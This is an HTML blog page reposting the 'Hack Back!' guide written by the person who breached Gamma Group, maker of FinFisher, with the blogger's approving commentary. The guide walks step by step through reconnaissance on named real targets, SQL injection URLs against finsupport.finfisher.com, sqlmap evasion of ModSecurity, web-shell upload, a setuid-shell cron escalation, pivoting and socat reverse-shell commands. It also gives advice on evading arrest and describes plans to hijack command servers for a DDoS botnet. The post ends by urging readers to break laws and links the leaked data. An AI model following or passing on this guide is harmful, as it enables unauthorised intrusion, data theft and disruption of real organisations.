@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<meta http-equiv="Cache-control" content="private,max-age:9800">
+	<meta name="description" content="Planet Earth's most widely read blog." /> 
+	<meta name="robots" content="index,follow,noarchive" />
+<link rel="icon" href="/favicon.ico" type="image/x-icon" />
+
+	<link rel="stylesheet" href="/wp-content/themes/trilema/style.css" type="text/css" media="screen" />
+
+<style type="text/css">  body {      	background: #fff url('/wp-content/themes/trilema/images/bg_apr2020.jpg') no-repeat center top; }  </style>
+
+	<link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="/feed/atom/" />
+	<link rel="alternate" type="application/rss+xml" title="Trilema RSS Feed" href="/feed/" />
+	<link rel="pingback" href="/xmlrpc.php" />
+		<title>The FinFisher/FinSpy story, for posterity. on Trilema - A blog by Mircea Popescu.</title>
+	<style type="text/css">
+						ol.footnotes li {list-style-type:lower-roman;}
+						ol.footnotes{font-size:0.8em; color:#000000;}		</style>
+<script language="JavaScript" type="text/javascript">
+if (top.location != self.location) top.location = self.location;
+</script>
+
+	
+</head>
+<body>
+
+
+<div id="base">
+	<div id="mask_head_ie"></div>
+	<div id="base2">
+		<div id="header">
+			<div id="blogtitle"><a href="/">Trilema</a></div>
+			<div id="subtitle">Lucruri fine pentru oameni subtiri.
+</div>
+
+
+
+			
+
+		</div>
+		<div id="mask_foot"></div>
+		<div id="container">
+<div id="content">        <div class="spacer"></div>             <span id="shash-55985"><div class="post" id="post-55985">                    <h1><a href="/2014/the-finfisherfinspy-story-for-posterity/" rel="bookmark" title="Permanent Link to The FinFisher/FinSpy story, for posterity.">The FinFisher/FinSpy story, for posterity.</a></h1>                        <div class="date">                                     Saturday, 09 August, Year 6 d.Tr.&nbsp;|&nbsp;Author: <a href="/author/admin/" title="Posts by Mircea Popescu">Mircea Popescu</a>                                                        </div>
+
+                        <div class="entry">
+<p>FinFisher (aka FinSpy) is a product marketed by a shell called Lench IT Solutions PLC, a subsidiary of Gamma International Ltd, a UK corporation subsidiary of Gamma International GmbH, a German corporation subsidiary of Gamma Group, which is owned through a web of offshore shells by an obnoxious septuagenarian named <a href="http://buggedplanet.info/index.php?title=NELSON,_WILLIAM_LOUTHEAN">William Louthean Nelson</a>. The whole charade is a GTS<sup><a href="#footnote_0_55985" id="identifier_0_55985" class="footnote-link footnote-identifier-link" title="Short for Golden Toilet Supplier, a corporate structure that extracts value from the public treasury through the process of purporting to sell the government (through its many unaudited or poorly audited agencies) overpriced and often shoddy products under the protection of various politicians. 
+The differential between the sale value as reported through the public budgets and the actual cost as expended by the GTS is rarely less than a degree of magnitude, and in general averages between two and three degrees of magnitude. 
+The public money thus `liberated` for private use finances political campaigns, governmental abuse and generally works as the primary sustenance of the entire corrupt nonsense we are here to permanently put an end to. Consequently, exposing, hindering and dismantling these graft networks is the #1 priority of Bitcoin, as the only acting representative of the will of the people and the good of the world.">i</a></sup> marketing a bevy of dubious, relatively useless proprietary repackaging of buggy software that does not approach the reliability, quality or flexibility of open source alternatives. </p>
+<p>FinFisher source code, pricing, support history, and other related data were retrieved from the Gamma International internal network and made available on the Internet a couple of days ago, but before we get to that<sup><a href="#footnote_1_55985" id="identifier_1_55985" class="footnote-link footnote-identifier-link" title="If you'd like a copy, here's a Magnet link">ii</a></sup>, here are a few words from the hacker : </p>
+<blockquote><p><code>
+<pre>                _   _            _      ____             _    _
+               | | | | __ _  ___| | __ | __ )  __ _  ___| | _| |
+               | |_| |/ _` |/ __| |/ / |  _ \ / _` |/ __| |/ / |
+               |  _  | (_| | (__|   <  | |_) | (_| | (__|   <|_|
+               |_| |_|\__,_|\___|_|\_\ |____/ \__,_|\___|_|\_(_)</pre>
+<p>     A DIY Guide for those without the patience to wait for whistleblowers</p>
+<p> --[ 1 ]-- Introduction</p>
+<p>I'm not writing this to brag about what an 31337 h4x0r I am and what m4d sk1llz it took to 0wn Gamma. I'm writing this to demystify hacking, to show how simple it is, and to hopefully inform and inspire you to go out and hack shit. If you have no experience with programming or hacking, some of the text below might look like a foreign language. Check the resources section at the end to help you get started. And trust me, once you've learned the basics you'll realize this really is easier than filing a FOIA request.</p>
+<p> --[ 2 ]-- Staying Safe</p>
+<p>This is illegal, so you'll need to take same basic precautions:</p>
+<p>1) Make a hidden encrypted volume with Truecrypt 7.1a [0] 2) Inside the encrypted volume install Whonix [1] 3) (Optional) While just having everything go over Tor thanks to Whonix is    probably sufficient, it's better to not use an internet connection connected    to your name or address. A cantenna, aircrack, and reaver can come in handy    here.</p>
+<p>[0] https://truecrypt.ch/downloads/<br />
+[1] https://www.whonix.org/wiki/Download#Install_Whonix</p>
+<p>As long as you follow common sense like never do anything hacking related outside of Whonix, never do any of your normal computer usage inside Whonix, never mention any information about your real life when talking with other hackers, and never brag about your illegal hacking exploits to friends in real life, then you can pretty much do whatever you want with no fear of being v&#038;.</p>
+<p>NOTE: I do NOT recommend actually hacking directly over Tor. While Tor is usable for some things like web browsing, when it comes to using hacking tools like nmap, sqlmap, and nikto that are making thousands of requests, they will run very slowly over Tor. Not to mention that you'll want a public IP address to receive connect back shells. I recommend using servers you've hacked or a VPS paid with bitcoin to hack from. That way only the low bandwidth text interface between you and the server is over Tor. All the commands you're running will have a nice fast connection to your target.</p>
+<p> --[ 3 ]-- Mapping out the target</p>
+<p>Basically I just repeatedly use fierce [0], whois lookups on IP addresses and domain names, and reverse whois lookups to find all IP address space and domain names associated with an organization.</p>
+<p>[0] http://ha.ckers.org/fierce/</p>
+<p>For an example let's take Blackwater. We start out knowing their homepage is at academi.com. Running fierce.pl -dns academi.com we find the subdomains: 67.238.84.228   email.academi.com 67.238.84.242   extranet.academi.com 67.238.84.240   mail.academi.com 67.238.84.230   secure.academi.com 67.238.84.227   vault.academi.com 54.243.51.249   www.academi.com</p>
+<p>Now we do whois lookups and find the homepage of www.academi.com is hosted on Amazon Web Service, while the other IPs are in the range: NetRange:       67.238.84.224 - 67.238.84.255 CIDR:           67.238.84.224/27 CustName:       Blackwater USA Address:        850 Puddin Ridge Rd</p>
+<p>Doing a whois lookup on academi.com reveals it's also registered to the same address, so we'll use that as a string to search with for the reverse whois lookups. As far as I know all the actual reverse whois lookup services cost money, so I just cheat with google: "850 Puddin Ridge Rd" inurl:ip-address-lookup "850 Puddin Ridge Rd" inurl:domaintools</p>
+<p>Now run fierce.pl -range on the IP ranges you find to lookup dns names, and fierce.pl -dns on the domain names to find subdomains and IP addresses. Do more whois lookups and repeat the process until you've found everything.</p>
+<p>Also just google the organization and browse around its websites. For example on academi.com we find links to a careers portal, an online store, and an employee resources page, so now we have some more: 54.236.143.203  careers.academi.com 67.132.195.12   academiproshop.com 67.238.84.236   te.academi.com 67.238.84.238   property.academi.com 67.238.84.241   teams.academi.com</p>
+<p>If you repeat the whois lookups and such you'll find academiproshop.com seems to not be hosted or maintained by Blackwater, so scratch that off the list of interesting IPs/domains.</p>
+<p>In the case of FinFisher what led me to the vulnerable finsupport.finfisher.com was simply a whois lookup of finfisher.com which found it registered to the name "FinFisher GmbH". Googling for: "FinFisher GmbH" inurl:domaintools finds gamma-international.de, which redirects to finsupport.finfisher.com</p>
+<p>...so now you've got some idea how I map out a target. This is actually one of the most important parts, as the larger the attack surface that you are able to map out, the easier it will be to find a hole somewhere in it.</p>
+<p> --[ 4 ]-- Scanning &#038; Exploiting</p>
+<p>Scan all the IP ranges you found with nmap to find all services running. Aside from a standard port scan, scanning for SNMP is underrated.</p>
+<p>Now for each service you find running:</p>
+<p>1) Is it exposing something it shouldn't? Sometimes companies will have services running that require no authentication and just assume it's safe because the url or IP to access it isn't public. Maybe fierce found a git subdomain and you can go to git.companyname.come/gitweb/ and browse their source code.</p>
+<p>2) Is it horribly misconfigured? Maybe they have an ftp server that allows anonymous read or write access to an important directory. Maybe they have a database server with a blank admin password (lol stratfor). Maybe their embedded devices (VOIP boxes, IP Cameras, routers etc) are using the manufacturer's default password.</p>
+<p>3) Is it running an old version of software vulnerable to a public exploit?</p>
+<p> Webservers deserve their own category. For any webservers, including ones nmap will often find running on nonstandard ports, I usually:</p>
+<p>1) Browse them. Especially on subdomains that fierce finds which aren't intended for public viewing like test.company.com or dev.company.com you'll often find interesting stuff just by looking at them.</p>
+<p>2) Run nikto [0]. This will check for things like webserver/.svn/, webserver/backup/, webserver/phpinfo.php, and a few thousand other common mistakes and misconfigurations.</p>
+<p>3) Identify what software is being used on the website. WhatWeb is useful [1]</p>
+<p>4) Depending on what software the website is running, use more specific tools like wpscan [2], CMS-Explorer [3], and Joomscan [4].</p>
+<p>First try that against all services to see if any have a misconfiguration, publicly known vulnerability, or other easy way in. If not, it's time to move on to finding a new vulnerability:</p>
+<p>5) Custom coded web apps are more fertile ground for bugs than large widely used projects, so try those first. I use ZAP [5], and some combination of its automated tests along with manually poking around with the help of its intercepting proxy.</p>
+<p>6) For the non-custom software they're running, get a copy to look at.  If it's free software you can just download it. If it's proprietary you can usually pirate it. If it's proprietary and obscure enough that you can't pirate it you can buy it (lame) or find other sites running the same software using google, find one that's easier to hack, and get a copy from them.</p>
+<p>[0] http://www.cirt.net/nikto2<br />
+[1] http://www.morningstarsecurity.com/research/whatweb<br />
+[2] http://wpscan.org/<br />
+[3] https://code.google.com/p/cms-explorer/<br />
+[4] http://sourceforge.net/projects/joomscan/<br />
+[5] https://code.google.com/p/zaproxy/</p>
+<p> For finsupport.finfisher.com the process was:</p>
+<p>* Start nikto running in the background.<br />
+* Visit the website. See nothing but a login page. Quickly check for sqli in the   login form.<br />
+* See if WhatWeb knows anything about what software the site is running.<br />
+* WhatWeb doesn't recognize it, so the next question I want answered is if this   is a custom website by Gamma, or if there are other websites using the same   software.<br />
+* I view the page source to find a URL I can search on (index.php isn't   exactly unique to this software). I pick Scripts/scripts.js.php, and google:   allinurl:"Scripts/scripts.js.php"<br />
+* I find there's a handful of other sites using the same software, all coded by   the same small webdesign firm. It looks like each site is custom coded but   they share a lot of code. So I hack a couple of them to get a collection of   code written by the webdesign firm.</p>
+<p>At this point I can see the news stories that journalists will write to drum up views: "In a sophisticated, multi-step attack, hackers first compromised a web design firm in order to acquire confidential data that would aid them in attacking Gamma Group..."</p>
+<p>But it's really quite easy, done almost on autopilot once you get the hang of it. It took all of a couple minutes to:</p>
+<p>* google allinurl:"Scripts/scripts.js.php" and find the other sites<br />
+* Notice they're all sql injectable in the first url parameter I try.<br />
+* Realize they're running Apache ModSecurity so I need to use sqlmap [0] with   the option --tamper='tamper/modsecurityversioned.py'<br />
+* Acquire the admin login information, login and upload a php shell [1] (the   check for allowable file extensions was done client side in javascript), and   download the website's source code.</p>
+<p>[0] http://sqlmap.org/<br />
+[1] https://epinna.github.io/Weevely/</p>
+<p>Looking through the source code they might as well have named it Damn Vulnerable Web App v2 [0]. It's got sqli, LFI, file upload checks done client side in javascript, and if you're unauthenticated the admin page just sends you back to the login page with a Location header, but you can have your intercepting proxy filter the Location header out and access it just fine.</p>
+<p>[0] http://www.dvwa.co.uk/</p>
+<p>Heading back over to the finsupport site, the admin /BackOffice/ page returns 403 Forbidden, and I'm having some issues with the LFI, so I switch to using the sqli (it's nice to have a dozen options to choose from). The other sites by the web designer all had an injectable print.php, so some quick requests to: </p>
+<ul>
+https://finsupport.finfisher.com/GGI/Home/print.php?id=1 and 1=1<br />
+https://finsupport.finfisher.com/GGI/Home/print.php?id=1 and 2=1
+</ul>
+<p>reveal that finsupport also has print.php and it is injectable. And it's database admin! For MySQL this means you can read and write files. It turns out the site has magicquotes enabled, so I can't use INTO OUTFILE to write files. But I can use a short script that uses sqlmap --file-read to get the php source for a URL, and a normal web request to get the HTML, and then finds files included or required in the php source, and finds php files linked in the HTML, to recursively download the source to the whole site.</p>
+<p>Looking through the source, I see customers can attach a file to their support tickets, and there's no check on the file extension. So I pick a username and password out of the customer database, create a support request with a php shell attached, and I'm in!</p>
+<p> --[ 5 ]-- (fail at) Escalating</p>
+<pre> ___________
+< got r00t? >
+ -----------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+            ^^^^^^^^^^^^^^^^</pre>
+<p>Root over 50% of linux servers you encounter in the wild with two easy scripts, Linux_Exploit_Suggester [0], and unix-privesc-check [1].</p>
+<p>[0] https://github.com/PenturaLabs/Linux_Exploit_Suggester<br />
+[1] https://code.google.com/p/unix-privesc-check/</p>
+<p>finsupport was running the latest version of Debian with no local root exploits, but unix-privesc-check returned:</p>
+<ul>
+WARNING: /etc/cron.hourly/mgmtlicensestatus is run by cron as root. The user www-data can write to /etc/cron.hourly/mgmtlicensestatus<br />
+WARNING: /etc/cron.hourly/webalizer is run by cron as root. The user www-data can write to /etc/cron.hourly/webalizer</ul>
+<p>so I add to /etc/cron.hourly/webalizer: chown root:root /path/to/my_setuid_shell chmod 04755 /path/to/my_setuid_shell</p>
+<p>wait an hour, and ....nothing. Turns out that while the cron process is running it doesn't seem to be actually running cron jobs. Looking in the webalizer directory shows it didn't update stats the previous month. Apparently after updating the timezone cron will sometimes run at the wrong time or sometimes not run at all and you need to restart cron after changing the timezone. ls -l /etc/localtime shows the timezone got updated June 6, the same time webalizer stopped recording stats, so that's probably the issue. At any rate, the only thing this server does is host the website, so I already have access to everything interesting on it. Root wouldn't get much of anything new, so I move on to the rest of the network.</p>
+<p> --[ 6 ]-- Pivoting</p>
+<p>The next step is to look around the local network of the box you hacked.  This is pretty much the same as the first Scanning &#038; Exploiting step, except that from behind the firewall many more interesting services will be exposed. A tarball containing a statically linked copy of nmap and all its scripts that you can upload and run on any box is very useful for this. The various nfs-* and especially smb-* scripts nmap has will be extremely useful.</p>
+<p>The only interesting thing I could get on finsupport's local network was another webserver serving up a folder called 'qateam' containing their mobile malware.</p>
+<p> --[ 7 ]-- Have Fun</p>
+<p>Once you're in their networks, the real fun starts. Just use your imagination. While I titled this a guide for wannabe whistleblowers, there's no reason to limit yourself to leaking documents. My original plan was to: 1) Hack Gamma and obtain a copy of the FinSpy server software 2) Find vulnerabilities in FinSpy server. 3) Scan the internet for, and hack, all FinSpy C&#038;C servers. 4) Identify the groups running them. 5) Use the C&#038;C server to upload and run a program on all targets telling them    who was spying on them. 6) Use the C&#038;C server to uninstall FinFisher on all targets. 7) Join the former C&#038;C servers into a botnet to DDoS Gamma Group.</p>
+<p>It was only after failing to fully hack Gamma and ending up with some interesting documents but no copy of the FinSpy server software that I had to make due with the far less lulzy backup plan of leaking their stuff while mocking them on twitter. Point your GPUs at FinSpy-PC+Mobile-2012-07-12-Final.zip and crack the password already so I can move on to step 2!</p>
+<p> --[ 8 ]-- Other Methods</p>
+<p>The general method I outlined above of scan, find vulnerabilities, and exploit is just one way to hack, probably better suited to those with a background in programming. There's no one right way, and any method that works is as good as any other. The other main ways that I'll state without going into detail are:</p>
+<p>1) Exploits in web browers, java, flash, or microsoft office, combined with emailing employees with a convincing message to get them to open the link or attachment, or hacking a web site frequented by the employees and adding the browser/java/flash exploit to that. This is the method used by most of the government hacking groups, but you don't need to be a government with millions to spend on 0day research or subscriptions to FinSploit or VUPEN to pull it off. You can get a quality russian exploit kit for a couple thousand, and rent access to one for much less. There's also metasploit browser autopwn, but you'll probably have better luck with no exploits and a fake flash updater prompt.</p>
+<p>2) Taking advantage of the fact that people are nice, trusting, and helpful 95% of the time. The infosec industry invented a term to make this sound like some sort of science: "Social Engineering". This is probably the way to go if you don't know too much about computers, and it really is all it takes to be a successful hacker [0].</p>
+<p>[0] https://www.youtube.com/watch?v=DB6ywr9fngU</p>
+<p> --[ 9 ]-- Resources</p>
+<p>Links:</p>
+<p>* <a href=https://www.pentesterlab.com/exercises/>pentesterlab.com/exercises</a><br />
+* <a href=http://overthewire.org/wargames/>overthewire.org/wargames/</a><br />
+* <a href=http://www.hackthissite.org/>hackthissite.org</a><br />
+* <a href=http://smashthestack.org/>smashthestack.org/</a><br />
+* <a href=http://www.win.tue.nl/~aeb/linux/hh/hh.html>win.tue.nl/~aeb/linux/hh</a><br />
+* <a href=http://www.phrack.com/>phrack.com</a><br />
+* <a href=http://pen-testing.sans.org/blog/2012/04/26/got-meterpreter-pivot>pen-testing.sans.org/got-meterpreter-pivot</a><br />
+* <a href=http://www.offensive-security.com/metasploit-unleashed/PSExec_Pass_The_Hash>offensive-security.com/PSExec_Pass_The_Hash</a><br />
+* <a href=https://securusglobal.com/community/2013/12/20/dumping-windows-credentials/>securusglobal.com/community/dumping-windows-credentials</a><br />
+* <a href=https://www.netspi.com/blog/entryid/140/resources-for-aspiring-penetration-testers>netspi.com/resources-for-aspiring-penetration-testers</a>   (all his other blog posts are great too)<br />
+* <a href=https://www.corelan.be/>corelan.be</a> (start at Exploit writing tutorial part 1)<br />
+* <a href=http://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/>exploiting-php-file-inclusion-overview</a> One trick it leaves out is that on most systems the apache access log is readable only by root, but you can still include from /proc/self/fd/10 or whatever fd apache opened it as. It would also be more useful if it mentioned what versions of php the various tricks were fixed in.<br />
+* <a href=http://www.dest-unreach.org/socat/>dest-unreach.org/socat</a> Get usable reverse shells with a statically linked copy of socat to drop on your target and: </p>
+<ul>
+target$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-listen:PORTNUM<br />
+host$ socat file:`tty`,raw,echo=0 tcp-connect:localhost:PORTNUM  </ul>
+<p>It's also useful for setting up weird pivots and all kinds of other stuff.</p>
+<p>Books:</p>
+<p>* The Web Application Hacker's Handbook<br />
+* Hacking: The Art of Exploitation<br />
+* The Database Hacker's Handbook<br />
+* The Art of Software Security Assessment<br />
+* A Bug Hunter's Diary<br />
+* Underground: Tales of Hacking, Madness, and Obsession on the Electronic Frontier<br />
+* TCP/IP Illustrated</p>
+<p>Aside from the hacking specific stuff almost anything useful to a system administrator for setting up and administering networks will also be useful for exploring them. This includes familiarity with the windows command prompt and unix shell, basic scripting skills, knowledge of ldap, kerberos, active directory, networking, etc.</p>
+<p> --[ 10 ]-- Outro</p>
+<p>You'll notice some of this sounds exactly like what Gamma is doing. Hacking is a tool. It's not selling hacking tools that makes Gamma evil. It's who their customers are targeting and with what purpose that makes them evil.<sup><a href="#footnote_2_55985" id="identifier_2_55985" class="footnote-link footnote-identifier-link" title="Actually, no. It's who's buying from them (current governments) and the way they got their money to buy (taxes) that makes them evil. Everything else's just, as Lenin would put it, bourgeois concilliatorism.">iii</a></sup> That's not to say that tools are inherently neutral. Hacking is an offensive tool. In the same way that guerrilla warfare makes it harder to occupy a country, whenever it's cheaper to attack than to defend it's harder to maintain illegitimate authority and inequality. So I wrote this to try to make hacking easier and more accessible. And I wanted to show that the Gamma Group hack really was nothing fancy, just standard sqli, and that you do have the ability to go out and take similar action.</code></p></blockquote>
+<p>All these observations are exactly correct. For all the puffery to the contrary, one kid with a linux box is actually more powerful than one NSA drone. What's worse, scale actually disfavors the centralist approach of the NSA and generally speaking of the corrupt old order : one thousand kids with one thousand linux boxen are over a thousand times more powerful than one thousand NSA drones. By the time we get to the millions the differential is no longer even computable : a million-strong NSA can actually not do anything at all<sup><a href="#footnote_3_55985" id="identifier_3_55985" class="footnote-link footnote-identifier-link" title="It is a well studied and well documented property of poorly managed systems that increase in resources lowers productivity. `Adding manpower to a late project only makes it later` and all that.">iv</a></sup>, and so we end up with a division by zero. (And this sort of thing is why Bitcoin is so powerful, too, when compared to the antiquated banking system it's <a href="/2013/stage-n-bitcoin-exists/">willy-nilly</a> replacing).</p>
+<p>So go forth and have fun. The more bad laws you break, the better a person you are.</p>
+&mdash;&mdash;&mdash;<ol class="footnotes"><li id="footnote_0_55985" class="footnote">Short for Golden Toilet Supplier, a corporate structure that extracts value from the public treasury through the process of purporting to sell the government (through its many unaudited or poorly audited agencies) overpriced and often shoddy products under the protection of various politicians. </p>
+<p>The differential between the sale value as reported through the public budgets and the actual cost as expended by the GTS is rarely less than a degree of magnitude, and in general averages between two and three degrees of magnitude. </p>
+<p>The public money thus "liberated" for private use finances political campaigns, governmental abuse and generally works as the primary sustenance of the entire corrupt nonsense we are here to permanently put an end to. Consequently, exposing, hindering and dismantling these graft networks is the #1 priority of Bitcoin, as the only <em>acting</em> representative of the will of the people and the good of the world. [<a href="#identifier_0_55985" class="footnote-link footnote-back-link">&#8617;</a>]</li><li id="footnote_1_55985" class="footnote">If you'd like a copy, here's a <a href="magnet:?xt=urn:btih:4e8564f0edcb3875ad2dbb9658ca3d615cc6c152&#038;dn=finfisher&#038;tr=http://bt.careland.com.cn:6969/announce&#038;tr=udp://tracker.coppersurfer.tk:6969/announce&#038;tr=udp://tracker.openbittorrent.com/announce">Magnet link</a> [<a href="#identifier_1_55985" class="footnote-link footnote-back-link">&#8617;</a>]</li><li id="footnote_2_55985" class="footnote">Actually, no. It's who's buying from them (current governments) and the way they got their money to buy (taxes) that makes them evil. Everything else's just, as Lenin would put it, bourgeois concilliatorism. [<a href="#identifier_2_55985" class="footnote-link footnote-back-link">&#8617;</a>]</li><li id="footnote_3_55985" class="footnote">It is a well studied and well documented property of poorly managed systems that increase in resources lowers productivity. "Adding manpower to a late project only makes it later" and all that. [<a href="#identifier_3_55985" class="footnote-link footnote-back-link">&#8617;</a>]</li></ol>
+              <div>
+                <div class="alignleft">&laquo; <a href="/2014/come-see-me-clutching-at-straws/">Come see me clutching at straws</a></div>
+                <div class="alignright"><a href="/2014/terms-of-endearment/">Terms of Endearment</a> &raquo;</div>
+              </div>
+
+<div class="clear"></div>
+                                                    </div>
+                  <div class="info">
+                             </span><span class="category">Category: <a href="/category/meta-psihoza/" title="View all posts in Meta psihoza" rel="category tag">Meta psihoza</a></span>
+   </div>
+                   <div class="info_bot"></div>
+            </div>
+          <div id="postmetadata">
+                        Comments feed : <a href='/2014/the-finfisherfinspy-story-for-posterity/feed/'>RSS 2.0</a>.                                             Leave your own <a href="#respond">comment</a> below, or send a <a href="/2014/the-finfisherfinspy-story-for-posterity/trackback/" rel="trackback">trackback</a>.                                   </div>
+  
+<!-- You can start editing here. -->
+
+
+
+
+		<strong id="respond">Add your cents!</strong>
+ <small>&raquo; <br /><ul>If this is your first comment, it will wait to be approved. This usually takes a few hours. Subsequent comments are not delayed.</ul></small>
+			<form action="/wp-comments-post.php" method="post" id="commentform">
+	
+
+<!--- This is just a decoy ;)
+
+<p><input type="text" name="author" id="author" value="" size="22" tabindex="1" />
+						<label for="author"><small>Name&nbsp;(required)</small></label></p>
+					<p><input type="text" name="email" id="email" value="" size="22" tabindex="2" />
+
+						<label for="email"><small>E-Mail (will not be published , required)</small></label></p>
+					<p><input type="text" name="url" id="url" value="http://pest" size="22" tabindex="3" />
+
+-->
+
+					<p><input type="text" name="author5107c12" id="author5107c12" value="" size="22" tabindex="1" />
+						<label for="author"><small>Name&nbsp;(required)</small></label></p>
+					<p><input type="text" name="email5107c12" id="email5107c12" value="" size="22" tabindex="2" />
+						<label for="email"><small>E-Mail
+</small></label></p>
+					<p><input type="text" name="url5107c12" id="url5107c12" value="" size="22" tabindex="3" />
+
+						<label for="url"><small>Website (optional)</small></label></p>
+
+<!--<p><small><strong>XHTML:</strong> You can use these tags:&nbsp;&lt;a href=&quot;&quot; title=&quot;&quot;&gt; &lt;abbr title=&quot;&quot;&gt; &lt;acronym title=&quot;&quot;&gt; &lt;b&gt; &lt;blockquote cite=&quot;&quot;&gt; &lt;cite&gt; &lt;code&gt; &lt;del datetime=&quot;&quot;&gt; &lt;em&gt; &lt;i&gt; &lt;q cite=&quot;&quot;&gt; &lt;strike&gt; &lt;strong&gt; </small></p>-->
+
+<!--- This is just a decoy ;)
+
+<p><input type="text" name="author" id="author" value="" size="22" tabindex="1" />
+						<label for="author"><small>Name&nbsp;(required)</small></label></p>
+					<p><input type="text" name="email" id="email" value="" size="22" tabindex="2" />
+
+						<label for="email"><small>E-Mail (will not be published , required)</small></label></p>
+					<p><input type="text" name="url" id="url" value="http://pest" size="22" tabindex="3" />
+
+-->
+
+				<p><textarea name="comment" id="comment" cols="60" rows="12" tabindex="4"></textarea></p>
+				<p><input name="submit" type="submit" id="submit" tabindex="5" value="Send" />
+				<input type="hidden" name="comment_post_ID" value="55985" /></p>
+				<input type="hidden" name="comment_post_time" value="1786337921-3.41.188.35" /></p>
+
+				
+			</form>
+  		</div><div id="sidebar">
+        <div id="sidebar_top"></div>
+        <div id="sidebar1">
+                <ul>
+         
+
+<ul>
+                        <h5>Recent Comments</h5>
+      <ul>
+      	<li><a href=/2011/ce-am-pierdut-si-voi-n-ati-avut/#comment-165319 >Mircea Popescu</a> It's baaaaack!!!</li>
+	<li><a href=/2021/royal-revolt-ii-complete-strategy-guide-also-by-very-far-the-best-on-the-internet/#comment-165310 >Mircea Popescu</a> Well, it's a both-ways tower defense, you build the pathway and the op...</li>
+	<li><a href=/2021/royal-revolt-ii-complete-strategy-guide-also-by-very-far-the-best-on-the-internet/#comment-165307 >Diana Coman</a>  the game went offline (it does that after five or so minutes of inactivity...</li>
+	<li><a href=/2021/the-apprenticeship-of-duddy-kravitz/#comment-165303 >Mircea Popescu</a> Ahahaha. If we met back when I was still in that line I'd have totally...</li>
+	<li><a href=/2021/the-apprenticeship-of-duddy-kravitz/#comment-165302 >pletzalcoatl</a> You were thinking a pallid Danny DeVito in a purple crushed velvet suit...</li>
+	<li><a href=/2019/forum-logs-for-05-nov-2015/#comment-165300 >Mircea Popescu</a> You're not fooling anyone, you know.</li>
+	<li><a href=/2019/forum-logs-for-05-nov-2015/#comment-165297 >Tyrone White</a> What's up to all</li>
+	<li><a href=/2021/hoe-jokes/#comment-165274 >Mircea Popescu</a> &updated.</li>
+	<li><a href=/2021/the-apprenticeship-of-duddy-kravitz/#comment-165253 >Mircea Popescu</a> PS. s/undertaker/liquidator/ on re-read. Nfi what I was thinking.</li>
+	<li><a href=/2016/lxs-ninxs/#comment-165251 >Mircea Popescu</a> Meh. More nudes less obscure software packages, I don't watsup or w/e.</li>
+	<li><a href=/2021/the-apprenticeship-of-duddy-kravitz/#comment-165250 >Mircea Popescu</a> Obscure TV actor, plenty of those. (I didn't, for instance, review the...</li>
+	<li><a href=/2021/the-apprenticeship-of-duddy-kravitz/#comment-165239 >CarpraC</a> Since this post brought up ancient actors, their experience and quality, what...</li>
+	<li><a href=/2016/lxs-ninxs/#comment-165227 >temptease</a> call me whatsapp +79910404425</li>
+	<li><a href=/2020/trilema-altogether-no-longer-showing/#comment-165222 >Mircea Popescu</a> Heh. Never heard of it. (I however have heard of that kinda posturing,...</li>
+	<li><a href=/2020/trilema-altogether-no-longer-showing/#comment-165221 >Anon</a> I don't know, some kind of "help you with your finances" scam/online...</li>
+	<li><a href=/2020/trilema-altogether-no-longer-showing/#comment-165220 >Mircea Popescu</a> No fucking idea, what is it ?</li>
+	<li><a href=/2020/trilema-altogether-no-longer-showing/#comment-165219 >Anon</a> In the same line, what is Intuit?</li>
+	<li><a href=/2020/kitty-freipurr-von-meow-and-other-tales-of-bring-your-own-adventure-to-tamarindo/#comment-165218 >Mircea Popescu</a> Heh. Nothing lasts forever, and the "independent woman" least of all.</li>
+	<li><a href=/2020/trilema-altogether-no-longer-showing/#comment-165217 >Mircea Popescu</a> Wtf is this inane nonsense! Oh, I get it, artificially interesting...</li>
+	<li><a href=/2020/kitty-freipurr-von-meow-and-other-tales-of-bring-your-own-adventure-to-tamarindo/#comment-165216 >lexy229</a> &gt; how exactly did you figure out what to do to have your avatar show up by...</li>
+	<li><a href=/2020/trilema-altogether-no-longer-showing/#comment-165214 >anon</a> Have a laugh Description Planet Earth's most widely read blog.... Read More Tim...</li>
+	<li><a href=/2020/trilema-altogether-no-longer-showing/#comment-165212 >Mircea Popescu</a> Heh, the yearly problems of last year's. What a life.</li>
+	<li><a href=/2021/breaking-usg-president-belect-pidden-announces-plans-to-sign-epochal-factaltering-change-footnote-executive-history/#comment-165102 >Mircea Popescu</a> Really, it's top100-ish pretty much everywhere.</li>
+	<li><a href=/2021/breaking-usg-president-belect-pidden-announces-plans-to-sign-epochal-factaltering-change-footnote-executive-history/#comment-165101 >anon</a> #117 in Russia too.</li>
+	<li><a href=/2021/breaking-usg-president-belect-pidden-announces-plans-to-sign-epochal-factaltering-change-footnote-executive-history/#comment-165100 >Joshue</a> Meanwhile when it comes to being famous in Gibraltar...</li>
+      </ul>
+   
+
+        <br />
+</ul>
+        </div>
+                <div id="sidebar2">
+                <ul>
+                        <li><h5>Recent Articles</h5><ul>
+                	<li><a href='/2021/n-i-meaning-h-went-to-m-and/' title='N &#038; I (meaning H) went to M and...'>N &#038; I (meaning H) went to M and...</a></li>
+	<li><a href='/2021/royal-revolt-ii-complete-strategy-guide-also-by-very-far-the-best-on-the-internet/' title='Royal Revolt II complete strategy guide, also by very far the best on the Internet.'>Royal Revolt II complete strategy guide, also by very far the best on the Internet.</a></li>
+	<li><a href='/2021/laltra-meta-del-cielo/' title='L&#039;altra metà del cielo'>L'altra metà del cielo</a></li>
+	<li><a href='/2021/hoe-jokes/' title='Hoe Jokes'>Hoe Jokes</a></li>
+	<li><a href='/2021/the-apprenticeship-of-duddy-kravitz/' title='The Apprenticeship of Duddy Kravitz'>The Apprenticeship of Duddy Kravitz</a></li>
+	<li><a href='/2021/moe-jokes/' title='Moe Jokes'>Moe Jokes</a></li>
+	<li><a href='/2021/joe-jokes/' title='Joe Jokes'>Joe Jokes</a></li>
+	<li><a href='/2021/carried-away/' title='Carried Away'>Carried Away</a></li>
+	<li><a href='/2021/the-value-of-subhuman-life-and-other-non-themes-of-scummy-preoccupation/' title='The value of subhuman life, and other non-themes of scummy preoccupation'>The value of subhuman life, and other non-themes of scummy preoccupation</a></li>
